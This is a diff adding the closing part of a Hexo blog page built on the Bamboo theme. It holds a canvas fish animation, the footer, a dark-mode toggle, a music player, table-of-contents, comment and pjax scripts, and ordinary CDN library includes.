+      this.points.length = 0, this.fishes.length = 0, this.watchIds.length = 0, this.intervalCount = this.MAX_INTERVAL_COUNT, this.width = this.$container.width(), this.height = this.$container.height(), this.fishCount = this.FISH_COUNT * this.width / 500 * this.height / 500, this.$canvas.attr({
+        width: this.width,
+        height: this.height
+      }), this.reverse = !1, this.fishes.push(new FISH(this)), this.createSurfacePoints()
+    },
+    watchWindowSize: function () {
+      this.clearTimer(), this.tmpWidth = this.$window.width(), this.tmpHeight = this.$window.height(), this.watchIds.push(setTimeout(this.jdugeToStopResize, this.WATCH_INTERVAL))
+    },
+    clearTimer: function () {
+      for (; this.watchIds.length > 0;) clearTimeout(this.watchIds.pop())
+    },
+    jdugeToStopResize: function () {
+      var t = this.$window.width(),
+        i = this.$window.height(),
+        e = t == this.tmpWidth && i == this.tmpHeight;
+      this.tmpWidth = t, this.tmpHeight = i, e && this.setup()
+    },
+    bindEvent: function () {
+      this.$window.on("resize", this.watchWindowSize), this.$container.on("mouseenter", this.startEpicenter), this.$container.on("mousemove", this.moveEpicenter)
+    },
+    getAxis: function (t) {
+      var i = this.$container.offset();
+      return {
+        x: t.clientX - i.left + this.$window.scrollLeft(),
+        y: t.clientY - i.top + this.$window.scrollTop()
+      }
+    },
+    startEpicenter: function (t) {
+      this.axis = this.getAxis(t)
+    },
+    moveEpicenter: function (t) {
+      var i = this.getAxis(t);
+      this.axis || (this.axis = i), this.generateEpicenter(i.x, i.y, i.y - this.axis.y), this.axis = i
+    },
+    generateEpicenter: function (t, i, e) {
+      if (!(i < this.height / 2 - this.THRESHOLD || i > this.height / 2 + this.THRESHOLD)) {
+        var h = Math.round(t / this.pointInterval);
+        h < 0 || h >= this.points.length || this.points[h].interfere(i, e)
+      }
+    },
+    reverseVertical: function () {
+      this.reverse = !this.reverse;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].reverseVertical()
+    },
+    controlStatus: function () {
+      for (var t = 0, i = this.points.length; t < i; t++) this.points[t].updateSelf();
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].updateNeighbors();
+      this.fishes.length < this.fishCount && 0 == --this.intervalCount && (this.intervalCount = this.MAX_INTERVAL_COUNT, this.fishes.push(new FISH(this)))
+    },
+    render: function () {
+      requestAnimationFrame(this.render), this.controlStatus(), this.context.clearRect(0, 0, this.width, this.height), this.context.fillStyle = this.FISH_COLOR;
+      for (var t = 0, i = this.fishes.length; t < i; t++) this.fishes[t].render(this.context);
+      this.context.save(), this.context.globalCompositeOperation = "xor", this.context.beginPath(), this.context.moveTo(0, this.reverse ? 0 : this.height);
+      for (t = 0, i = this.points.length; t < i; t++) this.points[t].render(this.context);
+      this.context.lineTo(this.width, this.reverse ? 0 : this.height), this.context.closePath(), this.context.fill(), this.context.restore()
+    }
+  },
+  SURFACE_POINT = function (t, i) {
+    this.renderer = t, this.x = i, this.init()
+  };
+  SURFACE_POINT.prototype = {
+    SPRING_CONSTANT: .03,
+    SPRING_FRICTION: .9,
+    WAVE_SPREAD: .3,
+    ACCELARATION_RATE: .01,
+    init: function () {
+      this.initHeight = this.renderer.height * this.renderer.INIT_HEIGHT_RATE, this.height = this.initHeight, this.fy = 0, this.force = {
+        previous: 0,
+        next: 0
+      }
+    },
+    setPreviousPoint: function (t) {
+      this.previous = t
+    },
+    setNextPoint: function (t) {
+      this.next = t
+    },
+    interfere: function (t, i) {
+      this.fy = this.renderer.height * this.ACCELARATION_RATE * (this.renderer.height - this.height - t >= 0 ? -1 : 1) * Math.abs(i)
+    },
+    updateSelf: function () {
+      this.fy += this.SPRING_CONSTANT * (this.initHeight - this.height), this.fy *= this.SPRING_FRICTION, this.height += this.fy
+    },
+    updateNeighbors: function () {
+      this.previous && (this.force.previous = this.WAVE_SPREAD * (this.height - this.previous.height)), this.next && (this.force.next = this.WAVE_SPREAD * (this.height - this.next.height))
+    },
+    render: function (t) {
+      this.previous && (this.previous.height += this.force.previous, this.previous.fy += this.force.previous), this.next && (this.next.height += this.force.next, this.next.fy += this.force.next), t.lineTo(this.x, this.renderer.height - this.height)
+    }
+  };
+  var FISH = function (t) {
+    this.renderer = t, this.init()
+  };
+  FISH.prototype = {
+    GRAVITY: .4,
+    init: function () {
+      this.direction = Math.random() < .5, this.x = this.direction ? this.renderer.width + this.renderer.THRESHOLD : -this.renderer.THRESHOLD, this.previousY = this.y, this.vx = this.getRandomValue(4, 10) * (this.direction ? -1 : 1), this.renderer.reverse ? (this.y = this.getRandomValue(1 * this.renderer.height / 10, 4 * this.renderer.height / 10), this.vy = this.getRandomValue(2, 5), this.ay = this.getRandomValue(.05, .2)) : (this.y = this.getRandomValue(6 * this.renderer.height / 10, 9 * this.renderer.height / 10), this.vy = this.getRandomValue(-5, -2), this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1, this.theta = 0, this.phi = 0
+    },
+    getRandomValue: function (t, i) {
+      return t + (i - t) * Math.random()
+    },
+    reverseVertical: function () {
+      this.isOut = !this.isOut, this.ay *= -1
+    },
+    controlStatus: function (t) {
+      this.previousY = this.y, this.x += this.vx, this.y += this.vy, this.vy += this.ay, this.renderer.reverse ? this.y > this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy -= this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(.05, .2)), this.isOut = !1) : this.y < this.renderer.height * this.renderer.INIT_HEIGHT_RATE ? (this.vy += this.GRAVITY, this.isOut = !0) : (this.isOut && (this.ay = this.getRandomValue(-.2, -.05)), this.isOut = !1), this.isOut || (this.theta += Math.PI / 20, this.theta %= 2 * Math.PI, this.phi += Math.PI / 30, this.phi %= 2 * Math.PI), this.renderer.generateEpicenter(this.x + (this.direction ? -1 : 1) * this.renderer.THRESHOLD, this.y, this.y - this.previousY), (this.vx > 0 && this.x > this.renderer.width + this.renderer.THRESHOLD || this.vx < 0 && this.x < -this.renderer.THRESHOLD) && this.init()
+    },
+    render: function (t) {
+      t.save(), t.translate(this.x, this.y), t.rotate(Math.PI + Math.atan2(this.vy, this.vx)), t.scale(1, this.direction ? 1 : -1), t.beginPath(), t.moveTo(-30, 0), t.bezierCurveTo(-20, 15, 15, 10, 40, 0), t.bezierCurveTo(15, -10, -20, -15, -30, 0), t.fill(), t.save(), t.translate(40, 0), t.scale(.9 + .2 * Math.sin(this.theta), 1), t.beginPath(), t.moveTo(0, 0), t.quadraticCurveTo(5, 10, 20, 8), t.quadraticCurveTo(12, 5, 10, 0), t.quadraticCurveTo(12, -5, 20, -8), t.quadraticCurveTo(5, -10, 0, 0), t.fill(), t.restore(), t.save(), t.translate(-3, 0), t.rotate((Math.PI / 3 + Math.PI / 10 * Math.sin(this.phi)) * (this.renderer.reverse ? -1 : 1)), t.beginPath(), this.renderer.reverse ? (t.moveTo(5, 0), t.bezierCurveTo(10, 10, 10, 30, 0, 40), t.bezierCurveTo(-12, 25, -8, 10, 0, 0)) : (t.moveTo(-5, 0), t.bezierCurveTo(-10, -10, -10, -30, 0, -40), t.bezierCurveTo(12, -25, 8, -10, 0, 0)), t.closePath(), t.fill(), t.restore(), t.restore(), this.controlStatus(t)
+    }
+  }, $(function () {
+    RENDERER.init()
+    $('.dark').click(function () {
+      setTimeout(() => {
+        RENDERER.setFishColor();
+        RENDERER.context.fill();
+      });
+    })
+  });
+</script>
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2020 - 2025 <a target="_blank" rel="noopener" href="https://github.com/godownio">godownio</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fas fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fas fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fas fa-moon" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-moon" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fas fa-lightbulb" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fas fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="album"
+  id="002VeS6r4L5fLZ"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://unpkg.com/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://unpkg.com/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+
+    <script src="/js/utils/index.js"></script>
+    <script src="/js/app.js"></script>
+    
+    <!-- 文章目录所需js -->
+<!-- <link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script> -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.18.2/tocbot.css">
+
+<script>
+  var headerEl = '',  //headers 
+    content = '.post-detail',//文章容器
+    idArr = {};  //标题数组以确定是否增加索引id
+  //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -70,
+    // headingsOffset: -($(window).height() * 0.4 - 45),
+    headingsOffset: -($(window).height() * 0.4 - 70),
+    // positionFixedSelector: '.toc-main',
+    // positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+    activeLinkClass: 'is-active-link',
+    orderedList: true,
+    collapseDepth: ,
+    // onClick: function (e) {},
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    document.addEventListener("DOMContentLoaded", function () {
+      tocbot.init(option);
+      mobileTocClick();
+    });
+
+  }
+
+  window.tocScrollFn = function () {
+    return bamboo.throttle(function () {
+      findHeadPosition();
+    }, 100)()
+  }
+  window.addEventListener('scroll', tocScrollFn);
+
+  const findHeadPosition = function (top) {
+    if ($('.toc-list').length <= 0) {
+      return false;
+    }
+    setTimeout(() => {  // or DOMContentLoaded 
+      autoScrollToc();
+    }, 0);
+  }
+
+  const autoScrollToc = function () {
+    const $activeItem = document.querySelector('.is-active-link');
+    const $cardToc = document.querySelector('.toc-content');
+    const activePosition = $activeItem.getBoundingClientRect().top
+    const sidebarScrollTop = $cardToc.scrollTop
+    if (activePosition > (document.documentElement.clientHeight - 100)) {
+      $cardToc.scrollTop = sidebarScrollTop + 150
+    }
+    if (activePosition < 150) {
+      $cardToc.scrollTop = sidebarScrollTop - 150
+    }
+  }
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+      mobileTocClick();
+    }
+  });
+  
+  // 手机端toc按钮点击出现目录
+  const mobileTocClick = function () {
+    const $cardTocLayout = document.getElementsByClassName('side_toc')[0];
+    const $cardToc = $cardTocLayout.getElementsByClassName('toc-content')[0];
+    let right = '45px';
+    if (window.innerWidth >= 551 && window.innerWidth <= 992) {
+      right = '100px'
+    }
+    const mobileToc = {
+      open: () => {
+        $cardTocLayout.style.cssText = 'animation: toc-open .3s; opacity: 1; right: ' + right
+      },
+
+      close: () => {
+        $cardTocLayout.style.animation = 'toc-close .2s'
+        setTimeout(() => {
+          $cardTocLayout.style.cssText = "opacity:''; animation: ''; right: ''"
+        }, 100)
+      }
+    }
+    document.getElementById('toc-mobile-btn').addEventListener('click', () => {
+      if (window.getComputedStyle($cardTocLayout).getPropertyValue('opacity') === '0') mobileToc.open()
+      else mobileToc.close()
+    })
+
+    $cardToc.addEventListener('click', (e) => {
+      if (window.innerWidth < 992) { // 小于992px的时候
+        mobileToc.close()
+      }
+    })
+  }
+</script>
+
+<style>
+  /* .is-position-fixed {
+    position: sticky !important;
+    top: 74px;
+  }
+
+  .toc-main ul {
+    counter-reset: show-list;
+  }
+
+  .toc-main ul li::before {
+    content: counter(item)".";
+    display: block;
+    position: absolute;
+    left: 12px;
+    top: 0;
+  } */
+</style>
+ 
+
+<!-- 设置导航背景 -->
+<script>
+  let setHeaderClass = () => {
+    const nav = $('#navHeader');
+    const navTop = nav.outerHeight();
+    const winTop = $(window).scrollTop();
+    if(winTop > navTop) {
+      nav.addClass('header-bg-color');
+    }
+    else {
+      nav.removeClass('header-bg-color');
+    }
+  };
+
+  let scrollCollect = () => {
+    return bamboo.throttle(function (e) {
+      setHeaderClass();
+    }, 200)()
+  }
+
+  let initHeaderBg = () => {
+    setHeaderClass();
+  }
+
+  setHeaderClass();
+  window.addEventListener('scroll', scrollCollect);
+
+  document.addEventListener('pjax:send', function () {
+    window.removeEventListener('scroll', scrollCollect)
+  })
+  document.addEventListener('pjax:complete', function () {
+    window.addEventListener('scroll', scrollCollect);
+    setHeaderClass();
+  })
+</script> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的图片标签(getPhotoOnline)里的内容 -->
+<script>
+  function loadPhotoOnlineJS() {
+    if ($(".post-detail").find(".getJsonPhoto-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getPhotoOnline/index.js');
+  };
+  $(function () {
+    loadPhotoOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getPhotoJson == "undefined") {
+      loadPhotoOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的talk标签(getTalkOnline)里的内容 -->
+<script>
+  function loadTalkOnlineJS() {
+    if ($(".post-detail").find(".getJsonTalk-api").length == 0) {
+      return;
+    } 
+    loadScript('https://cdnjs.cloudflare.com/ajax/libs/waterfall.js/1.0.2/waterfall.min.js'); // 瀑布流插件，https://raphamorim.io/waterfall.js/
+    loadScript('/js/getTalkOnline/index.js');
+  };
+  $(function () {
+    loadTalkOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getTalkJson == "undefined") {
+      loadTalkOnlineJS();
+    }
+  })
+</script>
+
+<!-- 渲染远程json加载的site-card标签(getSiteOnline)里的内容 -->
+<script>
+  function loadSiteOnlineJS() {
+    if ($(".post-detail").find(".getJsonSite-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/getSiteOnline/index.js');
+  };
+  $(function () {
+    loadSiteOnlineJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof getSiteJson == "undefined") {
+      loadSiteOnlineJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://unpkg.com/v-plugs-ayu/lib/ayu.css">
+  <script src="https://unpkg.com/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fas fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+          }
+        })
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+  
+
+<!-- 图片懒加载 -->
+<script defer src="https://unpkg.com/vanilla-lazyload@17.1.0/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 0
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    lazyLoadInstance.update();
+  });
+  document.addEventListener('pjax:complete', function () {
+    lazyLoadInstance.update();
+  });
+</script>
+
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+  
+    <script type="text/javascript">
+  var utteranceCommon = {};
+
+  function check_utterance() {
+    let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+    if (isDark) {
+      utteranceCommon.Theme = 'github-dark';
+    } else {
+      utteranceCommon.Theme = 'github-light';
+    }
+
+    return document.getElementById("gitment-container");
+  }
+  comment_el = '#gitment-container';
+  load_utterance = function () {
+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceCommon.Theme)
+      utterances.setAttribute('repo', 'godownio/godownio.github.io')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceCommon.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+  
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
